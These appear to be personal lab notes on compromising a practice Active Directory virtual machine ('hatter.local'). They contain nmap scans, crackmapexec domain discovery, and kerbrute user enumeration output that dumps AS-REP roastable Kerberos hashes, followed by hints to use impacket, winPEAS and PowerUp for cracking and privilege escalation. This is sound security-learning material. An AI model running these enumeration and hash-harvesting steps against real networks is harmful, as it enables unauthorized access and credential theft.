assumed [[kerberos]] was running on the machine on port 88
checked for the MAC address in Virtual box in network settings
cross referenced the MAC address with the following [[nmap]] to locate the boxes ip on the network

```bash
sudo nmap -p 88 --open 192.168.0.0/24 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-04 05:20 EST
Nmap scan report for 192.168.0.59
Host is up (0.00081s latency).

PORT   STATE SERVICE
88/tcp open  kerberos-sec
MAC Address: 08:00:27:89:BE:2B (Oracle VirtualBox virtual NIC)

Nmap done: 256 IP addresses (29 hosts up) scanned in 4.59 seconds
```

box ip 192.168.0.59

nmap
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p- -T4 192.168.0.59
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-04 06:36 EST
Nmap scan report for 192.168.0.59
Host is up (0.0013s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
9389/tcp  open  adws
49668/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49672/tcp open  unknown
49679/tcp open  unknown
49688/tcp open  unknown
49699/tcp open  unknown
49707/tcp open  unknown
```

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,9389 -sV 192.168.0.59
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-04 07:59 EST
Nmap scan report for 192.168.0.59
Host is up (0.0016s latency).

PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
80/tcp   open  http         Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-03-04 17:44:51Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: hatter.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HATTER0)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: hatter.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
9389/tcp open  mc-nmf       .NET Message Framing
Service Info: Host: HATTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.19 seconds
```
port 53 shows domain open
navigating to 192.168.0.59:53 reveals Windows server
Windows server = Active Directory/AD

ports 139 netbios-ssn & 445 microsoft-ds indicate SMB is running

port 9389 adws/active directory Web Services

in order to run kerbrute, we need the domain controller name and the domain controller ip
to identify the DC name we can use remmina or crackmapexec
crackmapexec with garbage username and password reveals the DC info
dc name hatter.local
dc ip 192.168.0.59
```bash
┌──(kali㉿kali)-[~]
└─$ crackmapexec smb 192.168.0.59 -u adfas -p asdfa
SMB         192.168.0.59    445    HATTER           [*] Windows Server 2019 Standard Evaluation 17763 x64 (name:HATTER) (domain:hatter.local) (signing:True) (SMBv1:True)
SMB         192.168.0.59    445    HATTER           [-] hatter.local\adfas:asdfa STATUS_LOGON_FAILURE 
```

# running kerbrute userenum to identify usernames and see if pre-authentication not required is set
```bash
┌──(kali㉿kali)-[~/kerbrute/dist]
└─$ ./kerbrute_linux_amd64 userenum /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt --dc '192.168.0.59' -d 'hatter.local' -t 200
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 03/05/23 - Ronnie Flathers @ropnop

2023/03/05 04:05:47 >  Using KDC(s):
2023/03/05 04:05:47 >   192.168.0.59:88

2023/03/05 04:05:52 >  [+] VALID USERNAME:       administrator@hatter.local
2023/03/05 04:05:53 >  [+] alice has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$alice@HATTER.LOCAL:985066152e2af236474eda571d0bb258$45cfd00038346765b17f640af3f0898e6b74e93f8f2c850586b87d97545062bc56966b9367cc4b283e5effb1afa60699aae3ecbe02bacc09076e49818f8c529b3908d1a88efb3ff02160146ab2ad72b59eb3e8fac0e3da24f9ab613838e86c62580bb945287dc8f5091bc741e663aaf4ee482d3c13d771bdc17b350d10111ee7efc9b26395cafa0e6ac883e78924523bc21d7efaa940c5ebdc4fe5eda9b54f47221b0dbbd5a2aa14a0983c9a00ce7501060b52be59587df95196d23d142deca9d494ca3f73a511ac86eeb70010d196fae33545d463d8755a75514d491c458fe076b0c0c6cd9320064c1755f4110e799bc18268f84034df64119ec0a99569b63c                                                                         
2023/03/05 04:05:53 >  [+] VALID USERNAME:       alice@hatter.local
2023/03/05 04:06:11 >  [+] VALID USERNAME:       hatter@hatter.local
2023/03/05 04:06:28 >  [+] Alice has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$Alice@HATTER.LOCAL:0c271caf7ddec38e3b8b6cfb1eee5829$334070003a15a1b5ccd915627e250d085d4b6ac63e352da62ce0a5f515126110476b9164e5e395f9fe65183e5afd9d11df0ee1b2c72f14591f01c0f46e5f1045439737c6ed1e921a84aef40cec123e66ca25f8975b88a9c15af063d9f5443f631e2324054e02bd96c28b8db0c792ac41ae6d0cb3c05d95a47af0d4eb6b0f49b7d128d024be1f421ec17e65263b4b6ed896bd2bf1515e94c37db0bcfe5008b4e73e2aefa210e1db99b71b3135a164326c10c7e9914689f34201c6a65ca047f43cfeffb73a0df64498de28dc7ba8ede95d25403712ca53c3cc24c67e91bb294d88212d68e633c0ec59b1bacaf0bbac8481e43d98200ae7d8e8ca0ac00227bbe8d9                                                                         
2023/03/05 04:06:28 >  [+] VALID USERNAME:       Alice@hatter.local
2023/03/05 04:06:41 >  [+] VALID USERNAME:       Administrator@hatter.local
2023/03/05 04:09:20 >  [+] ALICE has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$ALICE@HATTER.LOCAL:0a0762e86a611c950c11665a9c563779$2a307d61b4c0dd3a7bd2f8d74995058c98a9c6353ac7d3654dad1cd18d5adbdcbd43f0e52f64277bc849ba30b3961933f0abd3175db783240a9911a4cf13871629af28d0e47723e799a4f3dc35c027bea61e8820886f56b4bf9de8607881340a97c095daef67de45dce9760a1ee8ffc212663c9ece8f34878b81f32151d9654b4fa9a0cd2eeb4f78afebafe79cf1138fa34663fda76f949063541306ce7001b155a8043e57a04eca120856cbfd44d6b64f01288e440b6d70eb454951db2d764f91f3e870f240e3155ab3b05883dd49915535e523b1a8950d0e7887f3b5c1d22d7bddfa2635bc91d0ade9503e11d49a6762bd6059bf5460c433cb9db5d5f83fe8                                                                         
2023/03/05 04:09:20 >  [+] VALID USERNAME:       ALICE@hatter.local
2023/03/05 04:10:13 >  [+] VALID USERNAME:       Hatter@hatter.local

```



Carrot's hints:139
[[impacket]], kerbrute, ldapdomaindump

powerup.ps1, [[winpeas]].exe or .bat for priv esc

so the hash you have [[john]] and [[hashcat]] do not like. So what you need to do is now use an [[impacket]] script to actually get a pre-auth not required, but I am not going to tell you which one, that is for you to research. But there is something you can use to get that hash into a format so you can crack with [[john]] or with [[hashcat]], just need [[impacket]] to be able to do it


